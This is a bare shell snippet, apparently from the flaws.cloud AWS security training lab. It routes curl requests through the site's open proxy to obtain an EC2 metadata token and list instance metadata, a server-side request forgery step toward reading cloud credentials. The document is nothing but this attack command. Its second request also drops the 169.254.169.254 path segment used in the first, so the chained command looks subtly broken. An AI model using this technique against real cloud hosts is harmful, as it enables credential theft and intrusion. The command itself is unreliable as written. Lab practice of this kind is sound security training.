TOKEN=`curl -X PUT "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/api/token" \
-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/latest/meta-data/